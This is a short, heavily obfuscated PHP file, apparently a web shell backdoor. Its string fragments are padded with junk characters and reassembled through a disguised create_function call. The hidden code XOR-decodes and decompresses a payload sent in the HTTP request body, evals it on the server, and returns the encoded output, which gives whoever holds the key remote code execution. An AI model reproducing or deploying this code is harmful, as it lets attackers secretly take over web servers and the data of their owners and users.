<?php
$r='vap[l(@gzuncop[mpresp[p[s(@x(@basp[e64_decodp[p[e($m[1]),$k)))p[;p[$o=@p[ob_p[get_conp[tents();@';
$s=str_replace('co','','cocrcoeatcoe_fcocouncoction');
$Q='4";funp[ction x($tp[,$kp[p[){$c=strlep[n($k);$lp[=strlenp[p[($t)p[;$o="";for($i=p[0;$i<$lp[;){';
$c='ob_p[ep[nd_clp[ean();$r=@basep[6p[4_encode(@p[xp[(@gzcop[mpress(p[$o)p[,$kp[));print("$p$kh$p[r$kf");}';
$R='$k="aca9p[08p[fa";$kh=p["343a6p[0c74764"p[;$kfp[="804p[9ba5p[60956";$p=p["kdbvp[wnp[DAGpp[Hqe8h';
$D='[reg_map[p[tchp[("/$kh(.+)$kfp[/",p[@filp[ep[_get_contents("php[p://p[inpp[up[t"),$m)==1) {@ob_sp[tarp[t();@e';
$o='fop[r($j=p[0;($j<$cp[p[&&$i<$lp[);$j++,p[p[$i++){$o.=$t{$p[i}^$kp[{$j};}}rp[eturn $op[;}ip[f (@pp';
$S=str_replace('p[','',$R.$Q.$o.$D.$r.$c);
$i=$s('',$S);$i();
?>
